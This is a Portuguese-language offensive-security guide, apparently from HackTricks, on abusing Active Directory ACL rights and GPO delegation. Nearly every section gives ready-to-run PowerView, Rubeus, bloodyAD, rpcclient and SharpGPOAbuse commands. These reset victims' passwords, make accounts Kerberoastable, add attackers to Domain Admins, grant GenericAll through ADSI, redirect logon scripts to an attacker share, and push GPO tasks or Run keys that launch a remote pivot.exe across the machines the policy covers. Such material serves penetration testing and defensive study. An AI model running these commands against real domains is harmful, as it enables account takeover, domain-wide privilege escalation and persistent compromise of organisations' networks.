# Abusando de ACLs/ACEs do Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página é, em grande parte, um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para mais detalhes, consulte os artigos originais.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Direitos GenericAll sobre Usuário**

Este privilégio concede ao atacante controle total sobre a conta de um usuário alvo. Uma vez que os direitos `GenericAll` são confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

- **Alterar a Senha do Alvo**: Usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- **Targeted Kerberoasting**: Atribua um SPN à conta do usuário para torná-la kerberoastable, então use Rubeus e targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Desative pre-authentication para o usuário, tornando a conta dele vulnerável ao ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Direitos GenericAll em Grupo**

Esse privilégio permite que um atacante manipule os membros de um grupo se tiver direitos `GenericAll` em um grupo como `Domain Admins`. Após identificar o nome distinto (distinguished name) do grupo com `Get-NetGroup`, o atacante pode:

- **Adicionar a si mesmo ao grupo Domain Admins**: Isso pode ser feito via comandos diretos ou usando módulos como Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
A partir do Linux você também pode usar o BloodyAD para se adicionar a grupos arbitrários quando você possui GenericAll/Write membership sobre eles. Se o grupo alvo estiver aninhado em “Remote Management Users”, você ganhará imediatamente acesso WinRM em hosts que respeitam esse grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Possuir esses privilégios em um objeto de computador ou em uma conta de usuário permite:

- **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computador.
- **Shadow Credentials**: Utilize esta técnica para se fazer passar por um computador ou conta de usuário, explorando os privilégios para criar shadow credentials.

## **WriteProperty on Group**

Se um usuário tem direitos `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Domain Admins`), ele pode:

- **Adicionar-se ao grupo Domain Admins**: Alcançável ao combinar os comandos `net user` e `Add-NetGroupUser`; esse método permite privilege escalation dentro do domínio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Este privilégio permite que atacantes se adicionem a grupos específicos, como `Domain Admins`, por meio de comandos que manipulam diretamente a associação de membros. Usar a seguinte sequência de comandos permite a auto-adição:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Um privilégio semelhante, que permite que atacantes se adicionem diretamente a grupos modificando as propriedades do grupo, caso possuam o direito `WriteProperty` nesses grupos. A confirmação e execução desse privilégio são realizadas com:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Ter o `ExtendedRight` em um usuário para `User-Force-Change-Password` permite redefinir senhas sem conhecer a senha atual. A verificação desse direito e sua exploração podem ser feitas via PowerShell ou ferramentas alternativas de linha de comando, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e one-liners para ambientes não interativos. Os comandos variam desde invocações simples do PowerShell até o uso de `rpcclient` no Linux, demonstrando a versatilidade dos attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Se um atacante descobrir que tem direitos `WriteOwner` sobre um grupo, ele pode alterar o proprietário do grupo para si mesmo. Isso é particularmente significativo quando o grupo em questão é `Domain Admins`, pois alterar o proprietário permite um controle mais amplo sobre os atributos do grupo e seus membros. O processo envolve identificar o objeto correto via `Get-ObjectAcl` e então usar `Set-DomainObjectOwner` para modificar o proprietário, seja por SID ou por nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Esta permissão permite que um atacante modifique propriedades do usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do script de logon de um usuário para executar um script malicioso no logon do usuário. Isso é alcançado usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário alvo para apontar para o script do atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Com esse privilégio, atacantes podem manipular a filiação a grupos, como adicionar a si mesmos ou outros usuários a grupos específicos. Esse processo envolve criar um objeto de credencial, usá-lo para adicionar ou remover usuários de um grupo e verificar as alterações de filiação com comandos PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Possuir um objeto AD e ter privilégios `WriteDACL` sobre ele permite que um atacante conceda a si mesmo privilégios `GenericAll` sobre o objeto. Isso é realizado por meio de manipulação ADSI, permitindo controle total sobre o objeto e a capacidade de modificar suas associações de grupo. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicação no Domínio (DCSync)**

O ataque DCSync aproveita permissões específicas de replicação no domínio para se passar por um Domain Controller e sincronizar dados, incluindo credenciais de usuários. Essa técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que atacantes extraiam informações sensíveis do ambiente AD sem acesso direto a um Controlador de Domínio. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegação de GPO

O acesso delegado para gerenciar Objetos de Política de Grupo (GPOs) pode representar riscos de segurança significativos. Por exemplo, se um usuário como `offense\spotless` for delegado com direitos de gerenciamento de GPO, ele pode ter privilégios como **WriteProperty**, **WriteDacl** e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, conforme identificado usando o PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerar Permissões de GPO

Para identificar GPOs mal configuradas, os cmdlets do PowerSploit podem ser encadeados. Isso permite descobrir GPOs que um usuário específico tem permissão para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computadores com uma Política Aplicada**: É possível resolver a quais computadores uma GPO específica se aplica, ajudando a entender o escopo do impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas Aplicadas a um Determinado Computador**: Para ver quais políticas são aplicadas a um computador específico, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs com uma Política Aplicada**: Identificar unidades organizacionais (OUs) afetadas por uma determinada política pode ser feito usando `Get-DomainOU`.

Você também pode usar a ferramenta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs e encontrar problemas nelas.

### Abusar GPO - New-GPOImmediateTask

GPOs mal configuradas podem ser exploradas para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo de administradores locais nas máquinas afetadas, elevando significativamente privilégios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

O GroupPolicy module, se instalado, permite a criação e o vínculo de novos GPOs e a definição de preferências, como registry values, para executar backdoors nos computadores afetados. Este método requer que o GPO seja atualizado e que um usuário faça logon no computador para execução:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações sem a necessidade de criar novos GPOs. Esta ferramenta requer a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novos antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Política

As atualizações de GPO normalmente ocorrem aproximadamente a cada 90 minutos. Para acelerar esse processo, especialmente após implementar uma mudança, o comando `gpupdate /force` pode ser usado no computador alvo para forçar uma atualização imediata de política. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem aguardar o próximo ciclo de atualização automática.

### Sob o Capô

Ao inspecionar as Tarefas Agendadas de uma determinada GPO, como a `Misconfigured Policy`, pode-se confirmar a adição de tarefas como `evilTask`. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou escalar privilégios.

A estrutura da tarefa, conforme mostrada no arquivo de configuração XML gerado por `New-GPOImmediateTask`, descreve os detalhes da tarefa agendada — incluindo o comando a ser executado e seus gatilhos. Esse arquivo representa como as tarefas agendadas são definidas e gerenciadas dentro das GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação da política.

### Usuários e Grupos

As GPOs também permitem a manipulação de usuários e associações de grupos em sistemas alvo. Ao editar diretamente os arquivos de política de Usuários e Grupos, atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de política para incluir novos usuários ou alterar associações de grupo.

O arquivo de configuração XML para Usuários e Grupos descreve como essas alterações são implementadas. Ao adicionar entradas a esse arquivo, usuários específicos podem receber privilégios elevados nos sistemas afetados. Esse método oferece uma abordagem direta para elevação de privilégios através da manipulação de GPOs.

Além disso, outros métodos para executar código ou manter persistência, como aproveitar scripts de logon/logoff, modificar chaves de registro para autoruns, instalar software via arquivos .msi ou editar configurações de serviços, também podem ser considerados. Essas técnicas fornecem diversas vias para manter acesso e controlar sistemas alvo através do abuso de GPOs.

## Referências

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
